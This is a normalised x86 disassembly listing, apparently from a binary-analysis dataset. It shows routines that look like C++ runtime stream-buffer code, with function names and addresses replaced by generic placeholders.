pop ecx
pop ecx
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x168 ]
call sub_100039c7
push r--data
lea esi [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xc
call sub_1000170e
mov eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
lea esi [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0xd
call sub_1000bba0
pop ecx
pop ecx
xor ebx ebx
push 0x0
inc ebx
push ebx
lea esi [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xf
call sub_10001a52
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0x90 ]
call sub_1000ba0f
mov esi [ ebp - 0x94 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_10001738
or [ ebp - 0x98 ] ebx
mov [ ebp - 0x4 ] 0xc
lea edi [ ebp - 0x90 ]
call sub_1000bae7
push 0x0
push ebx
lea esi [ ebp - 0x40 ]
call sub_10001a52
lea eax [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0xa
call sub_10002d01
mov eax r-xdata
retn
push 0x0
push 0x0
call sub_10013de1
sub_10003491
push 0xc
mov eax sub_10027bf8
call sub_10014213
mov edi ecx
xor eax eax
add edi 0x16c
mov [ ebp - 0x4 ] eax
mov ecx [ edi + 0xc ]
cmp ecx eax
je r-xdata
mov ebx [ edi + 0x10 ]
mov edx ebx
sub edx ecx
sar edx 0x3
cmp edx eax
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
sar eax 0x3
cmp ecx ebx
jbe r-xdata
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
inc esi
call sub_100048be
mov [ edi + 0x10 ] eax
jmp r-xdata
mov eax [ edi ]
push ebx
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_10004819
call sub_10010b92
push [ ebp + 0x8 ]
call sub_1000a358
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp + 0xc ]
call sub_1000863f
call sub_100142eb
retn 0x8
sub_10003518
push 0x3c
mov eax sub_10027bd5
call sub_10014213
and [ ebp - 0x10 ] 0x0
push r--data
lea esi [ ebp - 0x2c ]
call sub_1000170e
and [ ebp - 0x4 ] 0x0
mov eax esi
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_1000a953
push r--data
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
call sub_100064a6
add esp 0x14
push 0x0
push 0x1
lea esi [ ebp - 0x48 ]
call sub_10001a52
push 0x0
push 0x1
lea esi [ ebp - 0x2c ]
call sub_10001a52
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
sub_1000357b
push 0x24
mov eax sub_10028307
call sub_10014246
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_10007618
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x1c ]
call sub_10008382
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10006af2
pop ecx
lea ecx [ ebp - 0x1c ]
mov esi eax
call sub_100086e3
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x30 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ esi ]
mov [ ebp - 0x20 ] ecx
movzx ecx [ ebp + 0xc ]
push ecx
push [ ebp - 0x20 ]
add eax edi
push eax
push edx
push [ ebp - 0x30 ]
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x30 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn 0x8
push ebx
push [ ebp - 0x18 ]
call sub_100085e2
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_10003610
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000366c
push 0x1c
mov eax sub_100282da
call sub_10014246
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007618
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x18 ]
call sub_10008382
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10006af2
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_100086e3
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ esi ]
push ecx
add eax edi
push eax
push edx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100085e2
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_100036fa
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10003756
push 0x1c
mov eax sub_100282ad
call sub_10014246
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007618
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x18 ]
call sub_10008382
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10006af2
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_100086e3
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ esi ]
push ecx
add eax edi
push eax
push edx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x4 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100085e2
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_100037e4
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10003840
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
xor ecx ecx
mov eax esi
mov [ esi + 0x18 ] 0x7
call sub_10001e05
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov ecx esi
call sub_100019c6
mov eax esi
leave
retn 0xc
sub_1000386e
push 0x0
mov eax sub_10026d50
call sub_10014213
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esi ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
call sub_10010ba2
pop ecx
call sub_100142eb
retn 0x4
push [ esi + 0x10 ]
call sub_100055f2
push [ esi + 0xc ]
call sub_10010ba2
pop ecx
sub_100038b5
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10010b92
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
retn
call sub_10010b92
sub_100038dd
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10010b92
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x1c
mov eax esi
retn
call sub_10010b92
sub_10003908
push 0x8
mov eax sub_10027fc3
call sub_10014213
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push edi
push esi
mov [ ebp - 0x10 ] 0x1
call sub_10005488
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_10005516
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_100142eb
retn 0x4
sub_1000398f
push 0x4
mov eax sub_10026bf9
call sub_10014213
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_10003a0d
mov ecx esi
call sub_100039e2
call sub_100142eb
retn
sub_10003a0d
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_100082de
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_10010ba2
pop ecx
sub_10003a56
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov bx [ ebp + 0x8 ]
mov eax 0xffff
cmp ax bx
jne r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp eax edx
jae r-xdata
test [ esi + 0x40 ] 0x2
je r-xdata
mov ecx [ esi + 0x34 ]
mov eax [ ecx ]
mov edx edi
lea eax [ edx + eax * 2 ]
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
test edi edi
jne r-xdata
mov eax 0xffff
jmp r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov [ ecx ] bx
mov ax bx
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov eax [ esi + 0x10 ]
add ebx ebx
sub ebx [ eax ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test ecx ecx
jbe r-xdata
push 0x20
pop ecx
jmp r-xdata
mov ecx ebx
shr ecx 0x1
cmp ecx 0x20
jae r-xdata
je r-xdata
mov eax 0x7fffffff
sub eax ecx
cmp eax ebx
jae r-xdata
add ecx ebx
mov [ ebp - 0x4 ] ecx
call sub_10002393
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test ecx ecx
shr ecx 0x1
jne r-xdata
jne r-xdata
push edx
push [ ebp - 0x4 ]
mov eax ebx
push edi
call sub_100023dd
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
mov eax [ esi + 0x3c ]
sub eax edx
sar eax 0x1
lea eax [ edi + eax * 2 ]
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
sub eax edx
sar eax 0x1
lea ecx [ edi + eax * 2 ]
mov eax [ esi + 0x14 ]
mov ebx [ eax ]
sub ebx edx
sar ebx 0x1
lea ebx [ edi + ebx * 2 ]
mov [ eax ] ebx
mov eax [ esi + 0x24 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
add eax eax
sub eax ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x34 ]
add eax eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov ecx [ esi + 0x20 ]
mov ecx [ ecx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub ecx edx
sar ecx 0x1
lea ecx [ edi + ecx * 2 ]
sub eax ecx
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
inc eax
mov [ edi ] ecx
mov ecx [ esi + 0x30 ]
inc eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
push edx
call sub_10010ba2
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_10003c25
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
push esi
mov eax 0xffff
test edx edx
je r-xdata
pop esi
retn 0x4
mov esi [ ecx + 0x10 ]
cmp edx [ esi ]
jbe r-xdata
mov si [ esp + 0x8 ]
push edi
mov edi eax
cmp di si
pop edi
je r-xdata
mov edx [ ecx + 0x30 ]
inc [ edx ]
mov edx [ ecx + 0x20 ]
add [ edx ] 0xfffffffe
cmp ax si
je r-xdata
cmp si [ edx - 0x2 ]
je r-xdata
xor eax eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] si
movzx eax si
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10003c78
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
lea ebx [ esi + ebx * 2 ]
cmp esi ebx
jae r-xdata
mov eax 0xffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ edi ]
jmp r-xdata
mov eax 0xffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov ax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_10003cdc
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_10003e26
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_10003eff
push 0x4
mov eax sub_10027baa
call sub_10014213
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ esi ] r--data
mov [ esi + 0x54 ] r--data
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea edi [ esi + 0x4 ]
push edi
add ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_10005380
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_100053eb
mov eax edi
mov [ edi ] r--data
mov [ edi + 0x48 ] bl
mov [ edi + 0x41 ] bl
call sub_10005446
mov eax [ rw-data ]
mov [ edi + 0x4c ] ebx
mov [ edi + 0x44 ] eax
mov [ edi + 0x3c ] ebx
push [ ebp + 0xc ]
mov ebx edi
mov [ ebp - 0x4 ] 0x3
call sub_100049bc
test eax eax
jne r-xdata
mov eax esi
call sub_100142eb
retn 0x8
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_100084c5
or ecx 0x4
sub_10003fba
push 0x4
mov eax sub_1002716a
call sub_10014213
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_10003ff9
mov eax [ esi - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x4 ] r--data
call sub_100142eb
retn
sub_10003ff9
push 0x4
mov eax sub_10027144
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x48 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_100080d1
call sub_100142eb
retn
call sub_10004a34
sub_10004030
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10026d20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
mov edi ecx
mov [ esp + 0x20 ] edi
cmp ebx esi
jne r-xdata
mov eax [ edi + 0x24 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ edi + 0x4c ]
test eax eax
jne r-xdata
mov eax [ edi + 0x34 ]
mov edx [ eax ]
add edx ecx
cmp ecx edx
jae r-xdata
cmp [ edi + 0x3c ] 0x0
jne r-xdata
mov eax esi
jmp r-xdata
dec [ eax ]
mov edi [ edi + 0x24 ]
mov eax [ edi ]
lea ecx [ eax + 0x1 ]
mov [ edi ] ecx
mov [ eax ] bl
mov eax ebx
jmp r-xdata
push 0x8
pop esi
lea eax [ esp + 0x4c ]
mov [ esp + 0x13 ] bl
call sub_100047b7
and [ esp + 0x78 ] 0x0
lea eax [ esp + 0x34 ]
lea ecx [ esp + 0x4c ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ebx [ esp + 0x60 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x4c ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ecx [ edi + 0x3c ]
lea esi [ esp + 0x18 ]
push esi
mov esi [ esp + 0x18 ]
add ebx esi
push ebx
mov [ esp + 0x2c ] eax
push [ esp + 0x2c ]
mov eax [ ecx ]
lea esi [ esp + 0x28 ]
push esi
lea esi [ esp + 0x24 ]
push esi
lea edx [ edi + 0x44 ]
lea esi [ esp + 0x27 ]
push esi
push edx
mov [ esp + 0x44 ] edx
call [ eax + 0x14 ]
jmp r-xdata
push eax
movsx eax bl
push eax
call sub_10010f73
pop ecx
cmp eax esi
pop ecx
mov eax ebx
jne r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x4
test eax eax
jge r-xdata
jmp r-xdata
cmp eax 0x1
jg r-xdata
or esi 0xffffffff
cmp eax 0x3
jne r-xdata
lea eax [ esp + 0x3c ]
lea ecx [ esp + 0x4c ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ebx [ esp + 0x18 ]
sub ebx eax
je r-xdata
movsx eax [ esp + 0x13 ]
push [ edi + 0x4c ]
push eax
call sub_10010f73
or esi 0xffffffff
pop ecx
pop ecx
cmp eax esi
je r-xdata
lea eax [ esp + 0x13 ]
mov [ edi + 0x41 ] 0x1
cmp [ esp + 0x1c ] eax
jne r-xdata
lea eax [ esp + 0x44 ]
lea ecx [ esp + 0x4c ]
call sub_1000950f
mov esi eax
call sub_100055bf
push [ edi + 0x4c ]
push ebx
push 0x1
push eax
call sub_100111e1
add esp 0x10
cmp ebx eax
jne r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x54 ]
call sub_1000197b
jmp r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
test ebx ebx
ja r-xdata
lea eax [ esp + 0x34 ]
lea ecx [ esp + 0x4c ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ebx [ esp + 0x60 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x4c ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ecx [ edi + 0x3c ]
mov edx [ ecx ]
lea esi [ esp + 0x18 ]
push esi
mov esi [ esp + 0x18 ]
add ebx esi
push ebx
push eax
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x27 ]
push eax
push [ esp + 0x40 ]
call [ edx + 0x14 ]
cmp [ esp + 0x60 ] 0x20
jae r-xdata
push 0x0
push 0x8
pop ebx
lea edi [ esp + 0x50 ]
call sub_100047d5
mov edi [ esp + 0x20 ]
sub_10004276
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
push ebx
mov ebx [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov edx [ ecx + 0x10 ]
cmp [ edx ] eax
jae r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ ecx + 0x3c ] 0x0
jne r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov ecx [ ecx + 0x20 ]
dec [ ecx ]
mov eax ebx
inc eax
neg eax
sbb eax eax
and eax ebx
jmp r-xdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne r-xdata
push eax
